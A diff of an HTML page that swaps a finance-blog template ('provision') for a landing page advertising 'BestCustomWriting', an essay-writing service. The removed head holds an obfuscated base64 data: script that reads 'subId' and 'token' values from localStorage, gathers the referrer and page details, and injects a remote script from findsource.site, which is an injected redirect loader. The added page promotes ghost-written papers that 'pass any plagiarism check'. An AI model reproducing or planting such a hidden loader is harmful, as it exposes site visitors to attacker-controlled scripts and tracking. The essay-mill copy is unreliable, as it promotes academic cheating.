@@ -1,512 +1,380 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<head>
-<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfM1R4dlYycDFDTmdQTmtRaic7CiAgICBpZiAoIXdpbmRvdy5fM1R4dlYycDFDTmdQTmtRaikgewogICAgICAgIHdpbmRvdy5fM1R4dlYycDFDTmdQTmtRaiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9maW5kc291cmNlLnNpdGUvc1BUZkJ6UkgnLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwczovL2ZpbmRzb3VyY2Uuc2l0ZS85NTcwYTBiL3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX0hRWlA2ZzhaNkJKcXpZeHggPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9IUVpQNmc4WjZCSnF6WXh4ICE9PSAndW5kZWZpbmVkJyAmJiBfSFFaUDZnOFo2Qkpxell4eCAhPT0gbnVsbCkgewogICAgICAgIHZhciBfSjNXN2ttRmNmUGNWQjEzUSA9IEpTT04ucGFyc2UoX0hRWlA2ZzhaNkJKcXpZeHgpOwogICAgICAgIHZhciBfa0xLUmhtSlZHejJMNmtmUyA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9KM1c3a21GY2ZQY1ZCMTNRLmNyZWF0ZWRfYXQgKyB3aW5kb3cuXzNUeHZWMnAxQ05nUE5rUWoudHRsIDwgX2tMS1JobUpWR3oyTDZrZlMpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF82ak40TkQ3bXZZbU5waHp3ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgXzg3RERkOWIxOTNYSjJmanMgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfa1htV0xON3pUYjRDVDMySCA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX2tYbVdMTjd6VGI0Q1QzMkggKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX2tYbVdMTjd6VGI0Q1QzMkggKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfa1htV0xON3pUYjRDVDMySCArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfa1htV0xON3pUYjRDVDMySCArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX2tYbVdMTjd6VGI0Q1QzMkggKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX2tYbVdMTjd6VGI0Q1QzMkggKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll8zVHh2VjJwMUNOZ1BOa1FqLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF82ak40TkQ3bXZZbU5waHp3ICE9PSAndW5kZWZpbmVkJyAmJiBfNmpONE5EN212WW1OcGh6dyAmJiB3aW5kb3cuXzNUeHZWMnAxQ05nUE5rUWoudW5pcXVlKSB7CiAgICAgICAgX2tYbVdMTjd6VGI0Q1QzMkggKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfNmpONE5EN212WW1OcGh6dyk7CiAgICB9CiAgICBpZiAodHlwZW9mIF84N0REZDliMTkzWEoyZmpzICE9PSAndW5kZWZpbmVkJyAmJiBfODdERGQ5YjE5M1hKMmZqcyAmJiB3aW5kb3cuXzNUeHZWMnAxQ05nUE5rUWoudW5pcXVlKSB7CiAgICAgICAgX2tYbVdMTjd6VGI0Q1QzMkggKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF84N0REZDliMTkzWEoyZmpzKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll8zVHh2VjJwMUNOZ1BOa1FqLlJfUEFUSCArIF9rWG1XTE43elRiNENUMzJIOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
-    <meta charset="UTF-8">
-    <meta name="description" content="provision">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <head>
+    <title>BestCustomWriting - Free Bootstrap 4 Template by Colorlib</title>
+    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
-    <!-- Title -->
-    <title>provision</title>
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:200,300,400,500,600,700,800&display=swap" rel="stylesheet">
 
-    <!-- Favicon -->
-    <link rel="icon" href="img/core-img/favicon.ico">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
 
-    <!-- Core Stylesheet -->
-    <link href="style.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/animate.css">
 
-    <!-- Responsive CSS -->
-    <link href="css/responsive/responsive.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/owl.carousel.min.css">
+    <link rel="stylesheet" href="css/owl.theme.default.min.css">
+    <link rel="stylesheet" href="css/magnific-popup.css">
 
-</head>
+    <link rel="stylesheet" href="css/flaticon.css">
+    <link rel="stylesheet" href="css/style.css">
+  </head>
+  <body>
 
-<body class="(bg-pattern">
-    <!-- Preloader Start -->
-    <div id="preloader">
-        <div class="yummy-load"></div>
-    </div>
+    <div class="wrap">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-12">
+						<div class="bg-wrap">
+							<div class="row">
+								<div class="col-md-6 d-flex align-items-center">
+									<p class="mb-0 phone pl-md-2">
 
-    <!-- ****** Top Header Area Start ****** -->
-    <div class="top_header_area">
-        <div class="container">
-            <div class="row">
-                <div class="col-5 col-sm-6">
-                    <!--  Top Social bar start -->
-                    <div class="top_social_bar">
-                        <a href="#"><i class="fa fa-facebook" aria-hidden="true"></i></a>
-                        <a href="#"><i class="fa fa-twitter" aria-hidden="true"></i></a>
-                        <a href="#"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
-                        <a href="#"><i class="fa fa-skype" aria-hidden="true"></i></a>
-                        <a href="#"><i class="fa fa-dribbble" aria-hidden="true"></i></a>
-                    </div>
-                </div>
-                <!--  Login Register Area -->
-            </div>
+									</p>
+								</div>
+								<div class="col-md-6 d-flex justify-content-md-end">
+									<div class="social-media">
+						    		<p class="mb-0 d-flex">
+
+						    		</p>
+					        </div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<nav class="navbar navbar-expand-lg navbar-dark ftco_navbar bg-dark ftco-navbar-light" id="ftco-navbar">
+	    <div class="container">
+	    	<a class="navbar-brand" href="index.html">BestCustomWriting</a>
+	    	<form action="#" class="searchform order-sm-start order-lg-last">
+          <div class="form-group d-flex">
+            <input type="text" class="form-control pl-3" placeholder="Search">
+            <button type="submit" placeholder="" class="form-control search"><span class="fa fa-search"></span></button>
+          </div>
+        </form>
+	      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#ftco-nav" aria-controls="ftco-nav" aria-expanded="false" aria-label="Toggle navigation">
+	        <span class="fa fa-bars"></span> Menu
+	      </button>
+
+	    </div>
+	  </nav>
+    <!-- END nav -->
+    <div class="hero-wrap">
+	    <div class="home-slider owl-carousel">
+	      <div class="slider-item" style="background-image:url(images/bg_1.jpg);">
+	      	<div class="overlay"></div>
+	        <div class="container">
+	          <div class="row no-gutters slider-text align-items-center justify-content-center">
+		          <div class="col-md-8 ftco-animate">
+		          	<div class="text w-100 text-center">
+		          		<h2>Best custom Writing</h2>
+			            <h1 class="mb-4">Get a perfectly written paper in a few clicks!</h1>
+			            <p><a href="https://www.bestcustomwriting.com/?__utmla=27b54a40d7e6c27e7f3b5d667b6ac3ed" class="btn btn-white">PLACE AN ORDER</a></p>
+		            </div>
+		          </div>
+		        </div>
+	        </div>
+	      </div>
+
+	      <div class="slider-item" style="background-image:url(images/bg_2.jpg);">
+	      	<div class="overlay"></div>
+	        <div class="container">
+	          <div class="row no-gutters slider-text align-items-center justify-content-center">
+		          <div class="col-md-8 ftco-animate">
+		          	<div class="text w-100 text-center">
+		          		<h2>Best custom Writing</h2>
+			            <h1 class="mb-4">Get Custom-Written</h1>
+			             <p><a href="https://www.bestcustomwriting.com/?__utmla=27b54a40d7e6c27e7f3b5d667b6ac3ed" class="btn btn-white">PLACE AN ORDER</a></p>
+		            </div>
+		          </div>
+		        </div>
+	        </div>
+	      </div>
+
+	      <div class="slider-item" style="background-image:url(images/bg_3.jpg);">
+	      	<div class="overlay"></div>
+	        <div class="container">
+	          <div class="row no-gutters slider-text align-items-center justify-content-center">
+		          <div class="col-md-8 ftco-animate">
+		          	<div class="text w-100 text-center">
+		          		<h2>Get Custom-Written</h2>
+			            <h1 class="mb-4">Welcome to the Custom Writing Wonderland Every Student Can Trust</h1>
+			             <p><a href="https://www.bestcustomwriting.com/?__utmla=27b54a40d7e6c27e7f3b5d667b6ac3ed" class="btn btn-white">PLACE AN ORDER</a></p>
+		            </div>
+		          </div>
+		        </div>
+	        </div>
+	      </div>
+	    </div>
+	  </div>
+
+    <section class="ftco-section ftco-no-pt bg-light">
+    	<div class="container">
+    		<div class="row d-flex no-gutters">
+    			<div class="col-md-6 d-flex">
+    				<div class="img img-video d-flex align-self-stretch align-items-center justify-content-center justify-content-md-center mb-4 mb-sm-0" style="background-image:url(images/about.jpg);">
+    				</div>
+    			</div>
+    			<div class="col-md-6 pl-md-5 py-md-5">
+    				<div class="heading-section pl-md-4 pt-md-5">
+    					<span class="subheading">Welcome to BestCustomWriting</span>
+	            <h2 class="mb-4">We Are the Best BestCustomWriting Agency</h2>
+    				</div>
+    				<div class="services-2 w-100 d-flex">
+    					<div class="icon d-flex align-items-center justify-content-center"><span class="flaticon-wealth"></span></div>
+    					<div class="text pl-4">
+    						<h4>CONFIDENTIALITY</h4>
+    						<p>We keep no billing details. You’ll pay through secure and tested payment systems that are recognized all over the world.</p>
+    					</div>
+    				</div>
+    				<div class="services-2 w-100 d-flex">
+    					<div class="icon d-flex align-items-center justify-content-center"><span class="flaticon-accountant"></span></div>
+    					<div class="text pl-4">
+    						<h4>QUALITY</h4>
+    						<p>All custom writing we produce is of the highest caliber, with a well-researched material, proper formatting, and correct citation style.</p>
+    					</div>
+    				</div>
+    				<div class="services-2 w-100 d-flex">
+    					<div class="icon d-flex align-items-center justify-content-center"><span class="flaticon-teamwork"></span></div>
+    					<div class="text pl-4">
+    						<h4>AUTHORSHIP</h4>
+    						<p>You are the single owner of your project. We do not resell any academic papers written by our specialists.</p>
+    					</div>
+    				</div>
+    				<div class="services-2 w-100 d-flex">
+    					<div class="icon d-flex align-items-center justify-content-center"><span class="flaticon-BestCustomWriting"></span></div>
+    					<div class="text pl-4">
+    						<h4>ORIGINALITY</h4>
+    						<p>All writings are created from scratch according to your requirements. Every paper is grammatically flawless and can pass any plagiarism check.</p>
+    					</div>
+    				</div>
+	        </div>
         </div>
-    </div>
-    <!-- ****** Top Header Area End ****** -->
-
-    <!-- ****** Header Area Start ****** -->
-    <header class="header_area">
-        <div class="container">
-            <div class="row">
-                <!-- Logo Area Start -->
-                <div class="col-12">
-                    <div class="logo_area text-center">
-                        <a href="index.html" class="yummy-logo">provision</a>
-                    </div>
-                </div>
-            </div>
-
-            <div class="row">
-                <div class="col-12">
-                    <nav class="navbar navbar-expand-lg">
-                        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#yummyfood-nav" aria-controls="yummyfood-nav" aria-expanded="false" aria-label="Toggle navigation"><i class="fa fa-bars" aria-hidden="true"></i> Menu</button>
-                        <!-- Menu Area Start -->
-                        <div class="collapse navbar-collapse justify-content-center" id="yummyfood-nav">
-                            <ul class="navbar-nav" id="yummy-nav">
-                                <li class="nav-item">
-                                    <a class="nav-link" href="index.html">Main <span class="sr-only">(current)</span></a>
-                                </li>
-                                <li class="nav-item dropdown">
-                                    <a class="nav-link dropdown-toggle" href="#" id="yummyDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Articles</a>
-                                    <div class="dropdown-menu" aria-labelledby="yummyDropdown">
-                                        
-                                        <a class="dropdown-item" href="3f5be4434ab05684c6cfe48afcf6b7d9.html">FORMS OF ASSET MARKET ...</a>
-                                        
-
-                                        <a class="dropdown-item" href="ieaxFCQWlqIXF75G3IEZmcOpfgdu.html">Morning market review ...</a>
-                                        
-
-                                        <a class="dropdown-item" href="29b4f6bf851971bf7012f6aa7a17e057.html">We estimate the perfor...</a>
-                                        
-
-                                        <a class="dropdown-item" href="939e313ab08540a54f450b09c5e5f2a7.html">We buy currency at a f...</a>
-                                        
-
-                                    </div>
-                                </li>
-                                <li class="nav-item">
-                                    <a class="nav-link" href="contact.html">Contacts</a>
-                                </li>
-                            </ul>
-                        </div>
-                    </nav>
-                </div>
-            </div>
-        </div>
-    </header>
-    <!-- ****** Header Area End ****** -->
-
-    <!-- ****** Breadcumb Area Start ****** -->
-    <div class="breadcumb-area" style="background-image: url(./img/absolutvision-ucmkx2h1y38-unsplash.jpg);">
-        <div class="container h-100">
-            <div class="row h-100 align-items-center">
-                <div class="col-12">
-                    <div class="bradcumb-title text-center">
-                        <h2>My savings</h2>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- ****** Breadcumb Area End ****** -->
-
-    <!-- ****** Archive Area Start ****** -->
-    <section class="archive-area section_padding_80">
-        <div class="container">
-            <div class="row">
-                
-                <!-- Single Post -->
-                <div class="col-12 col-md-6 col-lg-4">
-                    <div class="single-post fadeInUp">
-                        <!-- Post Thumb -->
-                        <div class="post-thumb">
-                            <img src="./img/michael-longmire-3mu0iqglqto-unsplash.jpg" alt="">
-                        </div>
-                        <!-- Post Content -->
-                        <div class="post-content">
-                            <div class="post-meta d-flex">
-                                <!-- Post Comment & Share Area -->
-                                <div class="post-comment-share-area d-flex">
-                                    <!-- Post Favourite -->
-                                    <div class="post-favourite">
-                                        <a href=""><i class="fa fa-heart-o" aria-hidden="true"></i> 54</a>
-                                    </div>
-                                    <!-- Post Comments -->
-                                    <div class="post-comments">
-                                        <a href=""><i class="fa fa-comment-o" aria-hidden="true"></i> 247</a>
-                                    </div>
-                                    <!-- Post Share -->
-                                    <div class="post-share">
-                                        <a href=""><i class="fa fa-share-alt" aria-hidden="true"></i></a>
-                                    </div>
-                                </div>
-                            </div>
-                            <a href="3f5be4434ab05684c6cfe48afcf6b7d9.html">
-                                <h4 class="post-headline">FORMS OF ASSET MARKET ANALYSIS AND BINARY TRADING TECHNIQUES</h4>
-                            </a>
-                        </div>
-                    </div>
-                </div>
-                
-
-                <!-- Single Post -->
-                <div class="col-12 col-md-6 col-lg-4">
-                    <div class="single-post fadeInUp">
-                        <!-- Post Thumb -->
-                        <div class="post-thumb">
-                            <img src="./img/chronis-yan-1m4wytqvd4o-unsplash.jpg" alt="">
-                        </div>
-                        <!-- Post Content -->
-                        <div class="post-content">
-                            <div class="post-meta d-flex">
-                                <!-- Post Comment & Share Area -->
-                                <div class="post-comment-share-area d-flex">
-                                    <!-- Post Favourite -->
-                                    <div class="post-favourite">
-                                        <a href=""><i class="fa fa-heart-o" aria-hidden="true"></i> 313</a>
-                                    </div>
-                                    <!-- Post Comments -->
-                                    <div class="post-comments">
-                                        <a href=""><i class="fa fa-comment-o" aria-hidden="true"></i> 174</a>
-                                    </div>
-                                    <!-- Post Share -->
-                                    <div class="post-share">
-                                        <a href=""><i class="fa fa-share-alt" aria-hidden="true"></i></a>
-                                    </div>
-                                </div>
-                            </div>
-                            <a href="ieaxFCQWlqIXF75G3IEZmcOpfgdu.html">
-                                <h4 class="post-headline">Morning market review 05.03.2020</h4>
-                            </a>
-                        </div>
-                    </div>
-                </div>
-                
-
-                <!-- Single Post -->
-                <div class="col-12 col-md-6 col-lg-4">
-                    <div class="single-post fadeInUp">
-                        <!-- Post Thumb -->
-                        <div class="post-thumb">
-                            <img src="./img/zane-lee-ypvmezv5rfi-unsplash.jpg" alt="">
-                        </div>
-                        <!-- Post Content -->
-                        <div class="post-content">
-                            <div class="post-meta d-flex">
-                                <!-- Post Comment & Share Area -->
-                                <div class="post-comment-share-area d-flex">
-                                    <!-- Post Favourite -->
-                                    <div class="post-favourite">
-                                        <a href=""><i class="fa fa-heart-o" aria-hidden="true"></i> 386</a>
-                                    </div>
-                                    <!-- Post Comments -->
-                                    <div class="post-comments">
-                                        <a href=""><i class="fa fa-comment-o" aria-hidden="true"></i> 94</a>
-                                    </div>
-                                    <!-- Post Share -->
-                                    <div class="post-share">
-                                        <a href=""><i class="fa fa-share-alt" aria-hidden="true"></i></a>
-                                    </div>
-                                </div>
-                            </div>
-                            <a href="29b4f6bf851971bf7012f6aa7a17e057.html">
-                                <h4 class="post-headline">We estimate the performance of Polyus-Gold for the 1st quarter of 2018.</h4>
-                            </a>
-                        </div>
-                    </div>
-                </div>
-                
-
-                <!-- Single Post -->
-                <div class="col-12 col-md-6 col-lg-4">
-                    <div class="single-post fadeInUp">
-                        <!-- Post Thumb -->
-                        <div class="post-thumb">
-                            <img src="./img/zane-lee-pehs1twrnig-unsplash.jpg" alt="">
-                        </div>
-                        <!-- Post Content -->
-                        <div class="post-content">
-                            <div class="post-meta d-flex">
-                                <!-- Post Comment & Share Area -->
-                                <div class="post-comment-share-area d-flex">
-                                    <!-- Post Favourite -->
-                                    <div class="post-favourite">
-                                        <a href=""><i class="fa fa-heart-o" aria-hidden="true"></i> 317</a>
-                                    </div>
-                                    <!-- Post Comments -->
-                                    <div class="post-comments">
-                                        <a href=""><i class="fa fa-comment-o" aria-hidden="true"></i> 181</a>
-                                    </div>
-                                    <!-- Post Share -->
-                                    <div class="post-share">
-                                        <a href=""><i class="fa fa-share-alt" aria-hidden="true"></i></a>
-                                    </div>
-                                </div>
-                            </div>
-                            <a href="939e313ab08540a54f450b09c5e5f2a7.html">
-                                <h4 class="post-headline">We buy currency at a favorable exchange rate.</h4>
-                            </a>
-                        </div>
-                    </div>
-                </div>
-                
-
-            </div>
-        </div>
+    	</div>
     </section>
-    <!-- ****** Archive Area End ****** -->
 
-    <!-- ****** Instagram Area Start ****** -->
-    <!--<div class="instargram_area owl-carousel section_padding_100_0 clearfix" id="portfolio">-->
 
-        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
-        <!--<div class="instagram_gallery_item">-->
-            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
-            <!--<img src="./img/john-unwin-ot93hal2tc4-unsplash.jpg" alt="">-->
-            <!--&lt;!&ndash; Hover &ndash;&gt;-->
-            <!--<div class="hover_overlay">-->
-                <!--<div class="yummy-table">-->
-                    <!--<div class="yummy-table-cell">-->
-                        <!--<div class="follow-me text-center">-->
-                        <!--</div>-->
-                    <!--</div>-->
-                <!--</div>-->
-            <!--</div>-->
-        <!--</div>-->
 
-        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
-        <!--<div class="instagram_gallery_item">-->
-            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
-            <!--<img src="./img/omid-armin-h5klqk2brpy-unsplash.jpg" alt="">-->
-            <!--&lt;!&ndash; Hover &ndash;&gt;-->
-            <!--<div class="hover_overlay">-->
-                <!--<div class="yummy-table">-->
-                    <!--<div class="yummy-table-cell">-->
-                        <!--<div class="follow-me text-center">-->
-
-                        <!--</div>-->
-                    <!--</div>-->
-                <!--</div>-->
-            <!--</div>-->
-        <!--</div>-->
-
-        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
-        <!--<div class="instagram_gallery_item">-->
-            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
-            <!--<img src="./img/absolutvision-ucmkx2h1y38-unsplash.jpg" alt="">-->
-            <!--&lt;!&ndash; Hover &ndash;&gt;-->
-            <!--<div class="hover_overlay">-->
-                <!--<div class="yummy-table">-->
-                    <!--<div class="yummy-table-cell">-->
-                        <!--<div class="follow-me text-center">-->
-
-                        <!--</div>-->
-                    <!--</div>-->
-                <!--</div>-->
-            <!--</div>-->
-        <!--</div>-->
-
-        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
-        <!--<div class="instagram_gallery_item">-->
-            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
-            <!--<img src="./img/zane-lee-tqhcvrmeb3q-unsplash.jpg" alt="">-->
-            <!--&lt;!&ndash; Hover &ndash;&gt;-->
-            <!--<div class="hover_overlay">-->
-                <!--<div class="yummy-table">-->
-                    <!--<div class="yummy-table-cell">-->
-                        <!--<div class="follow-me text-center">-->
-
-                        <!--</div>-->
-                    <!--</div>-->
-                <!--</div>-->
-            <!--</div>-->
-        <!--</div>-->
-
-        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
-        <!--<div class="instagram_gallery_item">-->
-            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
-            <!--<img src="./img/fabian-blank-pelskgra2nu-unsplash.jpg" alt="">-->
-            <!--&lt;!&ndash; Hover &ndash;&gt;-->
-            <!--<div class="hover_overlay">-->
-                <!--<div class="yummy-table">-->
-                    <!--<div class="yummy-table-cell">-->
-                        <!--<div class="follow-me text-center">-->
-
-                        <!--</div>-->
-                    <!--</div>-->
-                <!--</div>-->
-            <!--</div>-->
-        <!--</div>-->
-
-        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
-        <!--<div class="instagram_gallery_item">-->
-            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
-            <!--<img src="./img/zane-lee-q2bo4ry2tgw-unsplash.jpg" alt="">-->
-            <!--&lt;!&ndash; Hover &ndash;&gt;-->
-            <!--<div class="hover_overlay">-->
-                <!--<div class="yummy-table">-->
-                    <!--<div class="yummy-table-cell">-->
-                        <!--<div class="follow-me text-center">-->
-
-                        <!--</div>-->
-                    <!--</div>-->
-                <!--</div>-->
-            <!--</div>-->
-        <!--</div>-->
-
-        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
-        <!--<div class="instagram_gallery_item">-->
-            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
-            <!--<img src="./img/rupixen-com-gkxytnbxqfa-unsplash.jpg" alt="">-->
-            <!--&lt;!&ndash; Hover &ndash;&gt;-->
-            <!--<div class="hover_overlay">-->
-                <!--<div class="yummy-table">-->
-                    <!--<div class="yummy-table-cell">-->
-                        <!--<div class="follow-me text-center">-->
-
-                        <!--</div>-->
-                    <!--</div>-->
-                <!--</div>-->
-            <!--</div>-->
-        <!--</div>-->
-
-        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
-        <!--<div class="instagram_gallery_item">-->
-            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
-            <!--<img src="./img/james-frewin-9vklb5hfbca-unsplash.jpg" alt="">-->
-            <!--&lt;!&ndash; Hover &ndash;&gt;-->
-            <!--<div class="hover_overlay">-->
-                <!--<div class="yummy-table">-->
-                    <!--<div class="yummy-table-cell">-->
-                        <!--<div class="follow-me text-center">-->
-
-                        <!--</div>-->
-                    <!--</div>-->
-                <!--</div>-->
-            <!--</div>-->
-        <!--</div>-->
-
-    <!--</div>-->
-    <!-- ****** Our Creative Portfolio Area End ****** -->
-
-    <!-- ****** Footer Social Icon Area Start ****** -->
-    <div class="social_icon_area clearfix">
-        <div class="container">
-            <div class="row">
-                <div class="col-12">
-                    <div class="footer-social-area d-flex">
-                        <div class="single-icon">
-                            <a href="#"><i class="fa fa-facebook" aria-hidden="true"></i><span>facebook</span></a>
-                        </div>
-                        <div class="single-icon">
-                            <a href="#"><i class="fa fa-twitter" aria-hidden="true"></i><span>Twitter</span></a>
-                        </div>
-                        <div class="single-icon">
-                            <a href="#"><i class="fa fa-google-plus" aria-hidden="true"></i><span>GOOGLE+</span></a>
-                        </div>
-                        <div class="single-icon">
-                            <a href="#"><i class="fa fa-linkedin-square" aria-hidden="true"></i><span>linkedin</span></a>
-                        </div>
-                        <div class="single-icon">
-                            <a href="#"><i class="fa fa-instagram" aria-hidden="true"></i><span>Instagram</span></a>
-                        </div>
-                        <div class="single-icon">
-                            <a href="#"><i class="fa fa-vimeo" aria-hidden="true"></i><span>VIMEO</span></a>
-                        </div>
-                        <div class="single-icon">
-                            <a href="#"><i class="fa fa-youtube-play" aria-hidden="true"></i><span>YOUTUBE</span></a>
-                        </div>
-                    </div>
-                </div>
+    <section class="ftco-counter bg-light ftco-no-pt" id="section-counter">
+    	<div class="container">
+				<div class="row">
+          <div class="col-md-6 col-lg-3 d-flex justify-content-center counter-wrap ftco-animate">
+            <div class="block-18 text-center">
+              <div class="text">
+                <strong class="number" data-number="50">0</strong>
+              </div>
+              <div class="text">
+              	<span>Years of Experienced</span>
+              </div>
             </div>
-        </div>
-    </div>
-    <!-- ****** Footer Social Icon Area End ****** -->
-
-    <!-- ****** Footer Menu Area Start ****** -->
-    <footer class="footer_area">
-        <div class="container">
-            <div class="row">
-                <div class="col-12">
-                    <div class="footer-content">
-                        <!-- Logo Area Start -->
-                        <div class="footer-logo-area text-center">
-                            <a href="index.html" class="yummy-logo">provision</a>
-                        </div>
-                        <!-- Menu Area Start -->
-                        <nav class="navbar navbar-expand-lg">
-                            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#yummyfood-footer-nav" aria-controls="yummyfood-footer-nav" aria-expanded="false" aria-label="Toggle navigation"><i class="fa fa-bars" aria-hidden="true"></i> Menu</button>
-                            <!-- Menu Area Start -->
-                            <div class="collapse navbar-collapse justify-content-center" id="yummyfood-footer-nav">
-                                <ul class="navbar-nav">
-                                    <li class="nav-item">
-                                        <a class="nav-link" href="index.html">Main <span class="sr-only">(current)</span></a>
-                                    </li>
-                                    <li class="nav-item dropdown">
-                                        <a class="nav-link dropdown-toggle" href="#" id="yummyDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Articles</a>
-                                        <div class="dropdown-menu" aria-labelledby="yummyDropdown">
-                                            
-                                            <a class="dropdown-item" href="3f5be4434ab05684c6cfe48afcf6b7d9.html">FORMS OF ASSET MARKET ...</a>
-                                            
-
-                                            <a class="dropdown-item" href="ieaxFCQWlqIXF75G3IEZmcOpfgdu.html">Morning market review ...</a>
-                                            
-
-                                            <a class="dropdown-item" href="29b4f6bf851971bf7012f6aa7a17e057.html">We estimate the perfor...</a>
-                                            
-
-                                            <a class="dropdown-item" href="939e313ab08540a54f450b09c5e5f2a7.html">We buy currency at a f...</a>
-                                            
-
-                                        </div>
-                                    </li>
-                                    <li class="nav-item">
-                                        <a class="nav-link" href="contact.html">Contacts</a>
-                                    </li>
-                                    <li class="nav-item">
-                                        <a class="nav-link" href="terms.html">Terms and conditions</a>
-                                    </li>
-                                    <li class="nav-item">
-                                        <a class="nav-link" href="policy.html">Privacy policy</a>
-                                    </li>
-                                    <li class="nav-item">
-                                        <a class="nav-link" 
-                                    </li>
-                                </ul>
-                            </div>
-                        </nav>
-                    </div>
-                </div>
+          </div>
+          <div class="col-md-6 col-lg-3 d-flex justify-content-center counter-wrap ftco-animate">
+            <div class="block-18 text-center">
+              <div class="text">
+                <strong class="number" data-number="8500">0</strong>
+              </div>
+              <div class="text">
+              	<span>Cases Completed</span>
+              </div>
             </div>
+          </div>
+          <div class="col-md-6 col-lg-3 d-flex justify-content-center counter-wrap ftco-animate">
+            <div class="block-18 text-center">
+              <div class="text">
+                <strong class="number" data-number="20">0</strong>
+              </div>
+              <div class="text">
+              	<span>Awards Won</span>
+              </div>
+            </div>
+          </div>
+          <div class="col-md-6 col-lg-3 d-flex justify-content-center counter-wrap ftco-animate">
+            <div class="block-18 text-center">
+              <div class="text">
+                <strong class="number" data-number="50">0</strong>
+              </div>
+              <div class="text">
+              	<span>Expert Consultant</span>
+              </div>
+            </div>
+          </div>
         </div>
-    </footer>
-    <!-- ****** Footer Menu Area End ****** -->
+    	</div>
+    </section>
 
-    <!-- Jquery-2.2.4 js -->
-    <script src="js/jquery/jquery-2.2.4.min.js"></script>
-    <!-- Popper js -->
-    <script src="js/bootstrap/popper.min.js"></script>
-    <!-- Bootstrap-4 js -->
-    <script src="js/bootstrap/bootstrap.min.js"></script>
-    <!-- All Plugins JS -->
-    <script src="js/others/plugins.js"></script>
-    <!-- Active JS -->
-    <script src="js/active.js"></script>
-    <div class='cookie-banner'>
